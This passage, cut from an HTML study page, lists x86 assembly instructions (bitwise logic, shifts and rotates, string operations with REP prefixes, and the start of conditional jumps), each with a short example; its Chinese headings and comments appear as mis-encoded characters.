href="#é€»è¾‘è¿ç®—æŒ‡ä»¤" class="headerlink" title="é€»è¾‘è¿ç®—æŒ‡ä»¤"></a>é€»è¾‘è¿ç®—æŒ‡ä»¤</h1><h3 id="AND-ä¸è¿ç®—"><a href="#AND-ä¸è¿ç®—" class="headerlink" title="AND ä¸è¿ç®—"></a>AND ä¸è¿ç®—</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,10101110band al,11110110b;æ¶ˆé™¤ä½0,3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="OR-æˆ–è¿ç®—"><a href="#OR-æˆ–è¿ç®—" class="headerlink" title="OR æˆ–è¿ç®—"></a>OR æˆ–è¿ç®—</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,11100011bor al,00000100b;ä½2ç½®1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="XOR-å¼‚æˆ–è¿ç®—"><a href="#XOR-å¼‚æˆ–è¿ç®—" class="headerlink" title="XOR å¼‚æˆ–è¿ç®—"></a>XOR å¼‚æˆ–è¿ç®—</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,10110101bxor al,0;å¼‚æˆ–<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="NOT-å–å"><a href="#NOT-å–å" class="headerlink" title="NOT å–å"></a>NOT å–å</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,10101110bnot al;è¡¥é›†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TEST-æµ‹è¯•-ä¸¤æ“ä½œæ•°ä½œä¸è¿ç®—-ä»…ä¿®æ”¹æ ‡å¿—ä½-ä¸å›é€ç»“æœ"><a href="#TEST-æµ‹è¯•-ä¸¤æ“ä½œæ•°ä½œä¸è¿ç®—-ä»…ä¿®æ”¹æ ‡å¿—ä½-ä¸å›é€ç»“æœ" class="headerlink" title="TEST æµ‹è¯•(ä¸¤æ“ä½œæ•°ä½œä¸è¿ç®—,ä»…ä¿®æ”¹æ ‡å¿—ä½,ä¸å›é€ç»“æœ)"></a>TEST æµ‹è¯•(ä¸¤æ“ä½œæ•°ä½œä¸è¿ç®—,ä»…ä¿®æ”¹æ ‡å¿—ä½,ä¸å›é€ç»“æœ)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">test al,00001001b;æµ‹è¯•0,3ä½<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SHL-é€»è¾‘å·¦ç§»-ä½å…ƒä¹˜æ³•"><a href="#SHL-é€»è¾‘å·¦ç§»-ä½å…ƒä¹˜æ³•" class="headerlink" title="SHL é€»è¾‘å·¦ç§»,ä½å…ƒä¹˜æ³•"></a>SHL é€»è¾‘å·¦ç§»,ä½å…ƒä¹˜æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov bl,8Fh;BL=10001111bshl bl,1;CF=1,BL=00011110b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SAL-ç®—æœ¯å·¦ç§»-SHL"><a href="#SAL-ç®—æœ¯å·¦ç§»-SHL" class="headerlink" title="SAL ç®—æœ¯å·¦ç§»(=SHL)"></a>SAL ç®—æœ¯å·¦ç§»(=SHL)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">sal/shl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SHR-é€»è¾‘å³ç§»ï¼Œä½å…ƒé™¤æ³•"><a href="#SHR-é€»è¾‘å³ç§»ï¼Œä½å…ƒé™¤æ³•" class="headerlink" title="SHR é€»è¾‘å³ç§»ï¼Œä½å…ƒé™¤æ³•"></a>SHR é€»è¾‘å³ç§»ï¼Œä½å…ƒé™¤æ³•</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,0D0h;AL=11010000bshr al,1;AL=01101000b,CF=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SAR-ç®—æœ¯å³ç§»-SHR"><a href="#SAR-ç®—æœ¯å³ç§»-SHR" class="headerlink" title="SAR ç®—æœ¯å³ç§»(=SHR)"></a>SAR ç®—æœ¯å³ç§»(=SHR)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">sar/shr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ROL-å¾ªç¯å·¦ç§»"><a href="#ROL-å¾ªç¯å·¦ç§»" class="headerlink" title="ROL å¾ªç¯å·¦ç§»"></a>ROL å¾ªç¯å·¦ç§»</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">mov al,40h;AL=01000000brol al,1;AL=10000000brol al,3;AL=00000100b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ROR-å¾ªç¯å³ç§»"><a href="#ROR-å¾ªç¯å³ç§»" class="headerlink" title="ROR å¾ªç¯å³ç§»"></a>ROR å¾ªç¯å³ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,01h;AL=00000001bror al,1;AL=10000000bror al,3;AL=00010000b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="RCL-é€šè¿‡è¿›ä½çš„å¾ªç¯å·¦ç§»"><a href="#RCL-é€šè¿‡è¿›ä½çš„å¾ªç¯å·¦ç§»" class="headerlink" title="RCL é€šè¿‡è¿›ä½çš„å¾ªç¯å·¦ç§»"></a>RCL é€šè¿‡è¿›ä½çš„å¾ªç¯å·¦ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">clc;CF=0mov bl,88h;CF,BL=0 10001000brcl bl,1;CF,BL=1 00010000brcl bl,1;CF,BL=0 00100010b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="RCR-é€šè¿‡è¿›ä½çš„å¾ªç¯å³ç§»"><a href="#RCR-é€šè¿‡è¿›ä½çš„å¾ªç¯å³ç§»" class="headerlink" title="RCR é€šè¿‡è¿›ä½çš„å¾ªç¯å³ç§»"></a>RCR é€šè¿‡è¿›ä½çš„å¾ªç¯å³ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">stc ;CF=1mov ah,10h;AH,CF=00010000 1rcr ah,1;AH,CF=10001000 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šå…«ç§ç§»ä½æŒ‡ä»¤,å…¶ç§»ä½æ¬¡æ•°å¯è¾¾255æ¬¡</p><p>ç§»ä½ä¸€æ¬¡æ—¶, å¯ç›´æ¥ç”¨æ“ä½œç . å¦‚ SHL AX,1</p><p>ç§»ä½&gt;1æ¬¡æ—¶, åˆ™ç”±å¯„å­˜å™¨CLç»™å‡ºç§»ä½æ¬¡æ•°</p><p>å¦‚ MOV CL,04 SHL AX,CL</p><h3 id="SHLD-åŒç²¾åº¦å·¦ç§»"><a href="#SHLD-åŒç²¾åº¦å·¦ç§»" class="headerlink" title="SHLD åŒç²¾åº¦å·¦ç§»"></a>SHLD åŒç²¾åº¦å·¦ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">wval word 9BA6hmov ax,0AC36hshld wval,ax,4;wval=BA6Ah,å°†wvalå·¦ç§»4ä½ï¼Œå¹¶æŠŠAXçš„é«˜4ä½æ’å…¥wvalçš„ä½4ä½<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="SHRD-åŒç²¾åº¦å³ç§»"><a href="#SHRD-åŒç²¾åº¦å³ç§»" class="headerlink" title="SHRD åŒç²¾åº¦å³ç§»"></a>SHRD åŒç²¾åº¦å³ç§»</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov ax,234Bhmov dx,7654hshrd ax,dx,4;AXå³ç§»4ä½ï¼Œå¹¶æŠŠDXçš„ä½4ä½æ’å…¥AXçš„é«˜4ä½<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="ä¸²æŒ‡ä»¤"><a href="#ä¸²æŒ‡ä»¤" class="headerlink" title="ä¸²æŒ‡ä»¤"></a>ä¸²æŒ‡ä»¤</h1><h3 id="DS-SI-æºä¸²æ®µå¯„å­˜å™¨-æºä¸²å˜å€"><a href="#DS-SI-æºä¸²æ®µå¯„å­˜å™¨-æºä¸²å˜å€" class="headerlink" title="DS:SI æºä¸²æ®µå¯„å­˜å™¨ :æºä¸²å˜å€"></a>DS:SI æºä¸²æ®µå¯„å­˜å™¨ :æºä¸²å˜å€</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ESI-ç›®æ ‡ä¸²æ®µå¯„å­˜å™¨-ç›®æ ‡ä¸²å˜å€"><a href="#ESI-ç›®æ ‡ä¸²æ®µå¯„å­˜å™¨-ç›®æ ‡ä¸²å˜å€" class="headerlink" title="ESI ç›®æ ‡ä¸²æ®µå¯„å­˜å™¨:ç›®æ ‡ä¸²å˜å€"></a>ESI ç›®æ ‡ä¸²æ®µå¯„å­˜å™¨:ç›®æ ‡ä¸²å˜å€</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CX-é‡å¤æ¬¡æ•°è®¡æ•°å™¨"><a href="#CX-é‡å¤æ¬¡æ•°è®¡æ•°å™¨" class="headerlink" title="CX é‡å¤æ¬¡æ•°è®¡æ•°å™¨"></a>CX é‡å¤æ¬¡æ•°è®¡æ•°å™¨</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="AL-AX-æ‰«æå€¼"><a href="#AL-AX-æ‰«æå€¼" class="headerlink" title="AL/AX æ‰«æå€¼"></a>AL/AX æ‰«æå€¼</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Dæ ‡å¿—-0è¡¨ç¤ºé‡å¤æ“ä½œä¸­SIå’ŒDIåº”è‡ªåŠ¨å¢é‡-1è¡¨ç¤ºåº”è‡ªåŠ¨å‡é‡"><a href="#Dæ ‡å¿—-0è¡¨ç¤ºé‡å¤æ“ä½œä¸­SIå’ŒDIåº”è‡ªåŠ¨å¢é‡-1è¡¨ç¤ºåº”è‡ªåŠ¨å‡é‡" class="headerlink" title="Dæ ‡å¿— 0è¡¨ç¤ºé‡å¤æ“ä½œä¸­SIå’ŒDIåº”è‡ªåŠ¨å¢é‡; 1è¡¨ç¤ºåº”è‡ªåŠ¨å‡é‡"></a>Dæ ‡å¿— 0è¡¨ç¤ºé‡å¤æ“ä½œä¸­SIå’ŒDIåº”è‡ªåŠ¨å¢é‡; 1è¡¨ç¤ºåº”è‡ªåŠ¨å‡é‡</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Zæ ‡å¿—-ç”¨æ¥æ§åˆ¶æ‰«ææˆ–æ¯”è¾ƒæ“ä½œçš„ç»“æŸ"><a href="#Zæ ‡å¿—-ç”¨æ¥æ§åˆ¶æ‰«ææˆ–æ¯”è¾ƒæ“ä½œçš„ç»“æŸ" class="headerlink" title="Zæ ‡å¿— ç”¨æ¥æ§åˆ¶æ‰«ææˆ–æ¯”è¾ƒæ“ä½œçš„ç»“æŸ"></a>Zæ ‡å¿— ç”¨æ¥æ§åˆ¶æ‰«ææˆ–æ¯”è¾ƒæ“ä½œçš„ç»“æŸ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MOVS-ä¸²ä¼ é€-MOVSB-ä¼ é€å­—ç¬¦-MOVSW-ä¼ é€å­—-MOVSD-ä¼ é€åŒå­—"><a href="#MOVS-ä¸²ä¼ é€-MOVSB-ä¼ é€å­—ç¬¦-MOVSW-ä¼ é€å­—-MOVSD-ä¼ é€åŒå­—" class="headerlink" title="MOVS ä¸²ä¼ é€   ( MOVSB ä¼ é€å­—ç¬¦ MOVSW ä¼ é€å­— MOVSD ä¼ é€åŒå­— )"></a>MOVS ä¸²ä¼ é€   ( MOVSB ä¼ é€å­—ç¬¦ MOVSW ä¼ é€å­— MOVSD ä¼ é€åŒå­— )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;ä¼ é€å­—ç¬¦ä¸²æ•°æ®ï¼šå°†ESIå¯»å€çš„å†…å­˜æ•°æ®å¤åˆ¶åˆ°EDIå¯»å€çš„å†…å­˜ä½ç½®;å¤åˆ¶åŒå­—æ•°å€¼source dword 20 dup(0FFFFFFFh)target dword 20 dup(?).codecld;æ–¹å‘ä¸ºæ­£mov ecx,lengthof source;è®¾ç½®REPè®¡æ•°å™¨mov esi,offset source;ESIæŒ‡å‘sourcemov edi,offset target;EDIæŒ‡å‘targetrep movsd;å¤åˆ¶åŒå­—<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CMPS-ä¸²æ¯”è¾ƒ-CMPSB-æ¯”è¾ƒå­—ç¬¦-CMPSW-æ¯”è¾ƒå­—"><a href="#CMPS-ä¸²æ¯”è¾ƒ-CMPSB-æ¯”è¾ƒå­—ç¬¦-CMPSW-æ¯”è¾ƒå­—" class="headerlink" title="CMPS ä¸²æ¯”è¾ƒ   ( CMPSB æ¯”è¾ƒå­—ç¬¦ CMPSW æ¯”è¾ƒå­— )"></a>CMPS ä¸²æ¯”è¾ƒ   ( CMPSB æ¯”è¾ƒå­—ç¬¦ CMPSW æ¯”è¾ƒå­— )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;æ¯”è¾ƒå­—ç¬¦ä¸²ï¼šæ¯”è¾ƒåˆ†åˆ«ç”±ESIå’ŒEDIå¯»å€çš„å†…å­˜æ•°æ®;æ¯”è¾ƒåŒå­—mov esi OFFSET sourcemov edi ,OFFSET targetcld;æ–¹å‘ä¸ºæ­£å‘mov ecx, LENGTHOF source;è®¾ç½®é‡å¤è®¡æ•°å™¨repe cmpsd;ç›¸ç­‰åˆ™é‡å¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SCAS-ä¸²æ‰«æ-æŠŠALæˆ–AXçš„å†…å®¹ä¸ç›®æ ‡ä¸²ä½œæ¯”è¾ƒ-æ¯”è¾ƒç»“æœåæ˜ åœ¨æ ‡å¿—ä½"><a href="#SCAS-ä¸²æ‰«æ-æŠŠALæˆ–AXçš„å†…å®¹ä¸ç›®æ ‡ä¸²ä½œæ¯”è¾ƒ-æ¯”è¾ƒç»“æœåæ˜ åœ¨æ ‡å¿—ä½" class="headerlink" title="SCAS ä¸²æ‰«æ    æŠŠALæˆ–AXçš„å†…å®¹ä¸ç›®æ ‡ä¸²ä½œæ¯”è¾ƒ,æ¯”è¾ƒç»“æœåæ˜ åœ¨æ ‡å¿—ä½"></a>SCAS ä¸²æ‰«æ    æŠŠALæˆ–AXçš„å†…å®¹ä¸ç›®æ ‡ä¸²ä½œæ¯”è¾ƒ,æ¯”è¾ƒç»“æœåæ˜ åœ¨æ ‡å¿—ä½</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;æ‰«æå­—ç¬¦ä¸²ï¼šæ¯”è¾ƒç´¯åŠ å™¨ï¼ˆALã€AXå’ŒEAXï¼‰ä¸EDIå¯»å€çš„å†…å­˜æ•°æ®;æ‰«ææ˜¯å¦æœ‰åŒ¹é…å­—ç¬¦alpha BYTE "ABCDEFGH",0.codemov edi,OFFSET alpha;EDIæŒ‡å‘å­—ç¬¦ä¸²mov al,'F';æ£€ç´¢å­—ç¬¦Fmov ecx,LENGTHOF alpha;è®¾ç½®æ£€ç´¢è®¡æ•°å™¨cld;æ–¹å‘ä¸ºæ­£å‘repne scasb;ä¸ç›¸ç­‰åˆ™é‡å¤jnz quit;è‹¥æœªå‘ç°å­—ç¬¦åˆ™é€€å‡ºdec edi;å‘ç°å­—ç¬¦: EDIå‡1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="LODS-è£…å…¥ä¸²-æŠŠæºä¸²ä¸­çš„å…ƒç´ -å­—æˆ–å­—èŠ‚-é€ä¸€è£…å…¥ALæˆ–AXä¸­-LODSB-ä¼ é€å­—ç¬¦-LODSW-ä¼ é€å­—-LODSD-ä¼ é€åŒå­—"><a href="#LODS-è£…å…¥ä¸²-æŠŠæºä¸²ä¸­çš„å…ƒç´ -å­—æˆ–å­—èŠ‚-é€ä¸€è£…å…¥ALæˆ–AXä¸­-LODSB-ä¼ é€å­—ç¬¦-LODSW-ä¼ é€å­—-LODSD-ä¼ é€åŒå­—" class="headerlink" title="LODS è£…å…¥ä¸²    æŠŠæºä¸²ä¸­çš„å…ƒç´ (å­—æˆ–å­—èŠ‚)é€ä¸€è£…å…¥ALæˆ–AXä¸­( LODSB ä¼ é€å­—ç¬¦ LODSW ä¼ é€å­— LODSD ä¼ é€åŒå­— )"></a>LODS è£…å…¥ä¸²    æŠŠæºä¸²ä¸­çš„å…ƒç´ (å­—æˆ–å­—èŠ‚)é€ä¸€è£…å…¥ALæˆ–AXä¸­( LODSB ä¼ é€å­—ç¬¦ LODSW ä¼ é€å­— LODSD ä¼ é€åŒå­— )</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;ä»å­—ç¬¦ä¸²åŠ è½½åˆ°ç´¯åŠ å™¨ï¼šå°†ESIå¯»å€çš„å†…å­˜æ•°æ®åŠ è½½åˆ°ç´¯åŠ å™¨;æ•°ç»„ä¹˜æ³•:æœ¬ç¨‹åºå°†ä¸€ä¸ª32ä½æ•´æ•°æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½ä¹˜ä»¥ä¸€ä¸ªå¸¸æ•°ã€‚INCLUDE Irvine32. inc.dataarray DWORD 1,2,3,4,5,6,7,8,9,10;æµ‹è¯•æ•°æ®multiplier DWORD 10;æµ‹è¯•æ•°æ®.codemain PROC    cld;æ–¹å‘ä¸ºæ­£å‘    mov esi,OFFSET array;æºæ•°ç»„ç´¢å¼•    mov edi,esi;ç›®æ ‡æ•°ç»„ç´¢å¼•    mov ecx,LENGTHOF array;å¾ªç¯è®¡æ•°å™¨Ll: lodsd;å°†[ESI]åŠ è½½åˆ°EAX    mul multiplier;ä¸å¸¸æ•°ç›¸ä¹˜    stosd;å°†EAXä¿å­˜åˆ°[EDI]    loop Ll    exitmain ENDPEND main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="STOS-ä¿å­˜ä¸²-æ˜¯LODSçš„é€†è¿‡ç¨‹"><a href="#STOS-ä¿å­˜ä¸²-æ˜¯LODSçš„é€†è¿‡ç¨‹" class="headerlink" title="STOS ä¿å­˜ä¸²   æ˜¯LODSçš„é€†è¿‡ç¨‹"></a>STOS ä¿å­˜ä¸²   æ˜¯LODSçš„é€†è¿‡ç¨‹</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;ä¿å­˜å­—ç¬¦ä¸²æ•°æ®Lï¼šå°†ç´¯åŠ å™¨å†…å®¹ä¿å­˜åˆ°EDIå¯»å€çš„å†…å­˜ä½ç½®.dataCount = 100string1 BYTE Count DUP(?).codemov al,OFFh;è¦ä¿å­˜çš„æ•°å€¼mov edi,OFFSET string1;EDIæŒ‡å‘ç›®æ ‡å­—ç¬¦ä¸²mov ecx,Count;å­—ç¬¦è®¡æ•°å™¨cld;æ–¹å‘ä¸ºæ­£å‘rep stosb;ç”¨ALçš„å†…å®¹å®ç°å¡«å……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="REP-å½“CX-ECX0æ—¶é‡å¤-å•ä¸ªæŒ‡ä»¤å¤„ç†æ•´ä¸ªå­—ç¬¦ä¸²"><a href="#REP-å½“CX-ECX0æ—¶é‡å¤-å•ä¸ªæŒ‡ä»¤å¤„ç†æ•´ä¸ªå­—ç¬¦ä¸²" class="headerlink" title="REP å½“CX/ECX<>0æ—¶é‡å¤(å•ä¸ªæŒ‡ä»¤å¤„ç†æ•´ä¸ªå­—ç¬¦ä¸²)"></a>REP å½“CX/ECX&lt;&gt;0æ—¶é‡å¤(å•ä¸ªæŒ‡ä»¤å¤„ç†æ•´ä¸ªå­—ç¬¦ä¸²)</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">rep movsb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="REPE-REPZ-å½“ZF-1æˆ–æ¯”è¾ƒç»“æœç›¸ç­‰-ä¸”CX-ECX0æ—¶é‡å¤"><a href="#REPE-REPZ-å½“ZF-1æˆ–æ¯”è¾ƒç»“æœç›¸ç­‰-ä¸”CX-ECX0æ—¶é‡å¤" class="headerlink" title="REPE/REPZ å½“ZF=1æˆ–æ¯”è¾ƒç»“æœç›¸ç­‰,ä¸”CX/ECX<>0æ—¶é‡å¤"></a>REPE/REPZ å½“ZF=1æˆ–æ¯”è¾ƒç»“æœç›¸ç­‰,ä¸”CX/ECX&lt;&gt;0æ—¶é‡å¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">repe cmpsd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="REPNE-REPNZ-å½“ZF-0æˆ–æ¯”è¾ƒç»“æœä¸ç›¸ç­‰-ä¸”CX-ECX0æ—¶é‡å¤"><a href="#REPNE-REPNZ-å½“ZF-0æˆ–æ¯”è¾ƒç»“æœä¸ç›¸ç­‰-ä¸”CX-ECX0æ—¶é‡å¤" class="headerlink" title="REPNE/REPNZ å½“ZF=0æˆ–æ¯”è¾ƒç»“æœä¸ç›¸ç­‰,ä¸”CX/ECX<>0æ—¶é‡å¤"></a>REPNE/REPNZ å½“ZF=0æˆ–æ¯”è¾ƒç»“æœä¸ç›¸ç­‰,ä¸”CX/ECX&lt;&gt;0æ—¶é‡å¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">repne scasb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="REPC-å½“CF-1ä¸”CX-ECX0æ—¶é‡å¤"><a href="#REPC-å½“CF-1ä¸”CX-ECX0æ—¶é‡å¤" class="headerlink" title="REPC å½“CF=1ä¸”CX/ECX<>0æ—¶é‡å¤"></a>REPC å½“CF=1ä¸”CX/ECX&lt;&gt;0æ—¶é‡å¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">repc movsb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="REPNC-å½“CF-0ä¸”CX-ECX0æ—¶é‡å¤"><a href="#REPNC-å½“CF-0ä¸”CX-ECX0æ—¶é‡å¤" class="headerlink" title="REPNC å½“CF=0ä¸”CX/ECX<>0æ—¶é‡å¤"></a>REPNC å½“CF=0ä¸”CX/ECX&lt;&gt;0æ—¶é‡å¤</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">repnc movsb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="ç¨‹åºè½¬ç§»æŒ‡ä»¤"><a href="#ç¨‹åºè½¬ç§»æŒ‡ä»¤" class="headerlink" title="ç¨‹åºè½¬ç§»æŒ‡ä»¤"></a>ç¨‹åºè½¬ç§»æŒ‡ä»¤</h1><h2 id="ç®€å•çš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤"><a href="#ç®€å•çš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤" class="headerlink" title="ç®€å•çš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤"></a>ç®€å•çš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤</h2><h3 id="JZ-æˆ–jE-OPRâ€”â€”â€”â€”â€”ç»“æœä¸ºé›¶è½¬ç§»-æµ‹è¯•æ¡ä»¶ZF-1ï¼›ç›¸ç­‰è·³è½¬"><a href="#JZ-æˆ–jE-OPRâ€”â€”â€”â€”â€”ç»“æœä¸ºé›¶è½¬ç§»-æµ‹è¯•æ¡ä»¶ZF-1ï¼›ç›¸ç­‰è·³è½¬" class="headerlink" title="JZ(æˆ–jE)  OPRâ€”â€”â€”â€”â€”ç»“æœä¸ºé›¶è½¬ç§», æµ‹è¯•æ¡ä»¶ZF=1ï¼›ç›¸ç­‰è·³è½¬"></a>JZ(æˆ–jE)  OPRâ€”â€”â€”â€”â€”ç»“æœä¸ºé›¶è½¬ç§», æµ‹è¯•æ¡ä»¶ZF=1ï¼›ç›¸ç­‰è·³è½¬</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">cmp eax,0jz/je L1;å¦‚æœZF=1åˆ™è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="JNZ-æˆ–jNE-OPR-â€”â€”â€”â€”â€“ç»“æœä¸ä¸ºé›¶è½¬ç§»-æµ‹è¯•æ¡ä»¶ZF-0ï¼›ä¸ç­‰è·³è½¬"><a href="#JNZ-æˆ–jNE-OPR-â€”â€”â€”â€”â€“ç»“æœä¸ä¸ºé›¶è½¬ç§»-æµ‹è¯•æ¡ä»¶ZF-0ï¼›ä¸ç­‰è·³è½¬" class="headerlink" title="JNZ(æˆ–jNE) OPR â€”â€”â€”â€”â€“ç»“æœä¸ä¸ºé›¶è½¬ç§»,æµ‹è¯•æ¡ä»¶ZF=0ï¼›ä¸ç­‰è·³è½¬"></a>JNZ(æˆ–jNE) OPR â€”â€”â€”â€”â€“ç»“æœä¸ä¸ºé›¶è½¬ç§»,æµ‹è¯•æ¡ä»¶ZF=0ï¼›ä¸ç­‰è·³è½¬</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">and dl,10110000bjnz/jne L2;ZF=0è·³è½¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="JS-OPRâ€”â€”â€”â€”â€”â€”â€”-ç»“æœä¸ºè´Ÿè½¬ç§»-æµ‹è¯•æ¡ä»¶SF-1"><a href="#JS-OPRâ€”â€”â€”â€”â€”â€”â€”-ç»“æœä¸ºè´Ÿè½¬ç§»-æµ‹è¯•æ¡ä»¶SF-1" class="headerlink" title="JS OPRâ€”â€”â€”â€”â€”â€”â€”-ç»“æœä¸ºè´Ÿè½¬ç§», æµ‹è¯•æ¡ä»¶SF=1"></a>JS OPRâ€”â€”â€”â€”â€”â€”â€”-ç»“æœä¸ºè´Ÿè½¬ç§», æµ‹è¯•æ¡ä»¶SF=1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SF=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNS-OPRâ€”â€”â€”â€”â€”â€”â€”ç»“æœä¸ºæ­£è½¬ç§»-æµ‹è¯•æ¡ä»¶SF-0"><a href="#JNS-OPRâ€”â€”â€”â€”â€”â€”â€”ç»“æœä¸ºæ­£è½¬ç§»-æµ‹è¯•æ¡ä»¶SF-0" class="headerlink" title="JNS OPRâ€”â€”â€”â€”â€”â€”â€”ç»“æœä¸ºæ­£è½¬ç§», æµ‹è¯•æ¡ä»¶SF=0"></a>JNS OPRâ€”â€”â€”â€”â€”â€”â€”ç»“æœä¸ºæ­£è½¬ç§», æµ‹è¯•æ¡ä»¶SF=0</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">SF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JO-OPRâ€”â€”â€”â€”â€”â€”â€”-æº¢å‡ºè½¬ç§»-æµ‹è¯•æ¡ä»¶OF-1"><a href="#JO-OPRâ€”â€”â€”â€”â€”â€”â€”-æº¢å‡ºè½¬ç§»-æµ‹è¯•æ¡ä»¶OF-1" class="headerlink" title="JO OPRâ€”â€”â€”â€”â€”â€”â€” æº¢å‡ºè½¬ç§»,   æµ‹è¯•æ¡ä»¶OF=1"></a>JO OPRâ€”â€”â€”â€”â€”â€”â€” æº¢å‡ºè½¬ç§»,   æµ‹è¯•æ¡ä»¶OF=1</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">OF=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JNO-OPR-â€”â€”â€”â€”â€”â€”â€“ä¸æº¢å‡ºè½¬ç§»-æµ‹è¯•æ¡ä»¶OF-0"><a href="#JNO-OPR-â€”â€”â€”â€”â€”â€”â€“ä¸æº¢å‡ºè½¬ç§»-æµ‹è¯•æ¡ä»¶OF-0" class="headerlink" title="JNO OPR â€”â€”â€”â€”â€”â€”â€“ä¸æº¢å‡ºè½¬ç§» , æµ‹è¯•æ¡ä»¶OF=0"></a>JNO OPR â€”â€”â€”â€”â€”â€”â€“ä¸æº¢å‡ºè½¬ç§» , æµ‹è¯•æ¡ä»¶OF=0</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">OF=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="JP-OPR-â€”â€”â€”â€”â€”â€”â€”ç»“æœä¸ºå¶è½¬ç§»-æµ‹è¯•æ¡ä»¶PF-1"><a 